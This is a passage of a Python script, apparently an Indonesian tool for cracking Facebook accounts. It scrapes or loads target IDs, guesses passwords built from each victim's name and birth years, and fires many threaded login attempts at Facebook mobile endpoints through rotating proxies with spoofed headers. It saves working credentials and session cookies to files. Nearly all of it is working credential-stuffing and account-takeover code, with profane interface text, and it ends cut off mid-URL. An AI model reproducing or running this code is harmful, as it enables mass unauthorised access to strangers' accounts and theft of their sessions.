				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
				tree.add(f"\r[green]{cpkuni[0]}|{cpkuni[1]}[white] ").add(f"\r[green]{cpkuni[2]}[white] ")
				Buat(tree)
				nocp +=1
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			input('[+] Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_filev2():
	prints(nel(f'{P2}Masukan file idz anda cth : [green]/sdcard/dump/ids.txt[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	o = input('[+] Nama file : ')
	try:lin = open(o).read().splitlines()
	except:
		prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
#-----------[crack dump file]----------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	if len(vin)==0:
		prints(nel(f'{P2}Kamu Tidak Memiliki File Dump{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	else:
		prints(nel(f'{P2}Pilih File yang ingin di crack [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n[+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			prints(nel(f'{P2}File Tidak Ditemukan, Coba Lagi Nanti{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()

#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
        pil = input('>> Masukkan Idz Target : ')
        try:
                koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
                for pi in koh2['subscribers']['data']:
                        try:id.append(pi['id']+'|'+pi['name'])
                        except:continue
                print(f'>> Total Idz :{h} '+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
                print('>> Koneksi Internet Bermasalah ')
                exit()
        except (KeyError,IOError):
                print('>> Gagal Mengambil Target ')
                exit()

#----------[seting method and password]----------#
def setting():
	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"ID {H2}{len(id)}{P2}",width=70,padding=(0,7),style=f"{color_panel}")) 
	hu = input('[+] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(nel(f'{P2}input correctly{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	prints(nel(f'{P2}[{color_text}01{P2}]. Method m.facebook.com [ [green]Validate[white] ]\n[{color_text}02{P2}]. Method free.facebook.com [ [green]Validate[white] ]\n[{color_text}03{P2}]. Method mbasic.facebook.com [ [green]Validate[white] ]\n[{color_text}04{P2}]. Method m.facebook.com [ [red]Reguler[white] ]\n[{color_text}05{P2}]. Method free.facebook.com [ [red]Reguler[white] ]\n[{color_text}06{P2}]. Method mbasic.facebook.com [ [red]Reguler[white] ]\n[{color_text}07{P2}]. Method m.facebook.com [ [red]Async[white] ]\n{P2}[{color_text}08{P2}]. Method touch.facebook.com [ [green] Async[white] ]\n{P2}[{color_text}99{P2}]. Method Lainya [ [green]Terbaru ] {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	#xxkontol=[]
	#xxkontol.append(Panel(f"""{P2}[{color_text}01{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}02{P2}]. Login site {H2}free.facebook.com\n{P2}[{color_text}03{P2}]. Login site {H2}mbasic.facebook.com{P2}""",title=f"Validate",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}04{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}05{P2}]. Login site {H2}free.facebook.com\n{P2}[{color_text}06{P2}]. Login site {H2}mbasic.facebook.com{P2}""",title=f"Reguler",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}07{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}08{P2}]. Login site {H2}b-api.facebook.com{P2}""",title=f"Async",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}09{P2}]. Login site {H2}iphone.facebook.com{P2}\n[{color_text}10{P2}]. Login site {H2}trun.facebook.com""",title=f"NewMethod",width=40,style=f"{color_table}"))
	#console.print(Columns(xxkontol))
	#prints(nel(f'{P2}Jika ingin crack menggunakan method langka ketik "{H2}p{P2}"-"{H2}m{P2}"-"{H2}n{P2}"',width=70,padding=(0,7),style=f"{color_panel}")) 
	hc = input('[+] Pilih : ')
	if hc in ['1','01']:
		#method.append('jikk')
		method.append('mobiledate')
	elif hc in ['4','04']:
		#khususprem()
		method.append('mobilereg')
	elif hc in ['2','02']:
		#khususprem()
		method.append('freedate')
	elif hc in ['5','05']:
		#khususprem()
		method.append('freereg')
	elif hc in ['3','03']:
		#khususprem()
		method.append('mbasicdate')
	elif hc in ['6','06']:
		#khususprem()
		method.append('mbasicreg')
	elif hc in ['8','08']:
		#khususprem()
		method.append('touch')
	elif hc in ['7','07']:
		#khususprem()
		method.append('pengen')
	elif hc in ['9','09']:
		#khususprem()
		method.append('baru')
	elif hc in ['10']:
		#khususprem()
		method.append('coba')
	elif hc in ['m','M']:
		#khususprem()
		method.append('jikk')
	elif hc in ['p','P']:
		#khususprem()
		method.append('pasii')
	elif hc in ['n','N']:
		#khususprem()
		method.append('noki')
	elif hc in ['Tes','tes']:
		method.append('touch')
	elif hc in ['99']:
		prints(nel(f'{P2}{P2}[{color_text}01{P2}]. Method Vidio\n{P2}[{color_text}02{P2}]. Method Iflix\n{P2}[{color_text}03{P2}]. Method bilibili\n{P2}[{color_text}04{P2}]. Method Wetv\n{P2}[{color_text}05{P2}]. Method Webnovel\n{P2}[{color_text}06{P2}]. Method Trun\n{P2}[{color_text}07{P2}]. Method Iphone\n{P2}[{color_text}08{P2}]. Method Prod\n{P2}[{color_text}09{P2}]. Method Nokia\n{P2}[{color_text}10{P2}]. Method capcut{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		hh = input('[+] Pilih : ')
		if hh in ['01','1']:
			method.append('vidio')
		elif hh in ['02','2']:
			method.append('iflix')
		elif hh in ['03','3']:
			method.append('bilibili')
		elif hh in ['04','4']:
			method.append('wetv')
		elif hh in ['05','5']:
			method.append('webnovel')
		elif hh in ['06','6']:
			method.append('coba')
		elif hh in ['07','7']:
			method.append('baru')
		elif hh in ['08','8']:
			method.append('pasii')
		elif hh in ['09','9']:
			method.append('noki')
		elif hh in ['10']:
			method.append('capcut')
		
	else:
		method.append('mobiledate')
	prints(nel(f'{P2}Mau tampilkan aplikasi/opsi yang terkait di dalam akun?{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	_Asepitgans_ = input('[+] Add tap aplikasi y/t > ')
	if _Asepitgans_ in ['']:
		prints(nel(f'{P2}Pilih yang bener lah anjing{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		back()
	elif _Asepitgans_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	#prints(nel(f'{P2}Mau tampilkan opsi cekpoint yang terkait di dalam akun?{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	_AsepitgasXC_ = input(f'[+] Add opsi cekpoin y/t > ')
	if _AsepitgasXC_ in ['']:
		prints(nel(f'{P2}Pilih yang bener lah anjing{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		back()
	elif _AsepitgasXC_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	
		#prints(nel(f'{P2}Enter an additional User-Agent dan cari di goole chrome\nExample :[green] My User Agent[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		#bzer = input(f'[+] Enter Addtional User-Agent : ')
		#ualu.append(bzer)
	#else:
		#ualuh.append('tidak')
	#prints(nel(f'{P2}Mau tambahkan password kah lu mek?{P2}',#width=70,padding=(0,7),style=f"{color_panel}"))
	#pwplus=input('[+] Add Password Manual y/t > ')
	#if pwplus in ['y','Y','ya']:
		#pwpluss.append('ya')
		#prints(nel(f'{P2}Enter an additional password of at least 6 #characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',#width=70,padding=(0,7),style=f"{color_panel}"))
		#pwku=input('[+] Enter Additional Password : ')
		#pwkuh=pwku.split(',')
		#for xpw in pwkuh:
			#pwnya.append(xpw)
	#else:
		#pwpluss.append('tidak')
	su()
	   

#-----------[password generator]----------#
def jancok():
	cetak(nel(f"{P2}[{color_text}01{P2}]. PasswordV¹  [{H2} Disarankan Ini {P2}]\n[{color_text}02{P2}]. PasswordV²  [{H2} Disarankan Ini {P2}]",width=70,style=f"{color_panel}")) 
	ch = input('[•] Pilih  : ')
	if ch in ['1','01']:
		babi()
	elif ch in ['2','02']:
		passu()
	else:
		passu()
	
def su():
	cetak(nel(f'{P2}{P2}[{color_text}01{P2}]. Password Manual\n{P2}[{color_text}02{P2}]. Password Gabungan\n{P2}[{color_text}03{P2}]. Password Otomatis{P2}',subtitle='04. Password Terbaru',width=70,padding=(0,7),style=f"{color_panel}"))
	hah = input('[+] pilih : ')
	if hah in ['1','01']:
		prints(nel(f'{P2}Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		pwku=input('[+] Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
		else:babi()
	if hah in ['3','03']:
		babi()
	if hah in ['2','02']:
		global ok,cp
		A = ["123456"]
		prints(nel(f'{P2}Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}\nbehind :[green] 123,1234,12345,123456[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		B = input(f'[+] Password : ').split(',')
		C = input(f'[+] Behind Password : ')
		if ',' in str(C):
			cetak(nel(f'sandi belakang satu kata saja'));exit()
		global prog,des
	prints(nel(f'\t {P2}Ok Simpan File : {H2}OK/%s\n\t {P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				Depan = nmf.split(' ')[0]
				pwv = ['bagong']
				if len(nmf)<=5:
					if len(Depan)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				else:
					if len(Depan)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2000')
						pwv.append(Depan+'2001')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'2005')
						pwv.append(Depan+'2006')
						pwv.append(Depan+'2007')
						pwv.append(Depan+'2008')
						pwv.append(Depan+'2010')
						pwv.append(Depan+'2009')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				else:
					pool.submit(touchV1,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
#-----------[crack berlangsung]----------#
def passu():
	global prog,des
	prints(nel(f'\t {P2}Ok Simpan File : {H2}OK/%s\n\t {P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				Depan = nmf.split(' ')[0]
				pwv = ['bagong']
				if len(nmf)<=5:
					if len(Depan)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				else:
					if len(Depan)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2000')
						pwv.append(Depan+'2001')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'2005')
						pwv.append(Depan+'2006')
						pwv.append(Depan+'2007')
						pwv.append(Depan+'2008')
						pwv.append(Depan+'2010')
						pwv.append(Depan+'2009')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				else:
					pool.submit(touchV1,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
		
		
def babi():
	global prog,des
	prints(nel(f'\t {P2}Ok Simpan File : {H2}OK/%s\n\t {P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['bagong']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'10')
						pwv.append(frs+'11')
						pwv.append(frs+'12')
						pwv.append(frs+'13')
						pwv.append(frs+'14')
						pwv.append(frs+'15')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'mbasicreg' in method:
					pool.submit(crackmbasicreg,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				else:
					pool.submit(touchV1,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
		

###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('fr=%s;datr=%s;c_user=%s;xs=%s'%(cookie['fr'],cookie['datr'],cookie['c_user'],cookie['xs']))
	return(str(cok))
	
	
###----------[ ASYNC ]----------###
def touchV1(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Capcut {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'])
	ua2 = random.choice(ugen3)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}Airplane Mode Activated! {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def touch(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Touch Async {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'])
	ua2 = random.choice(ugen3)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5Y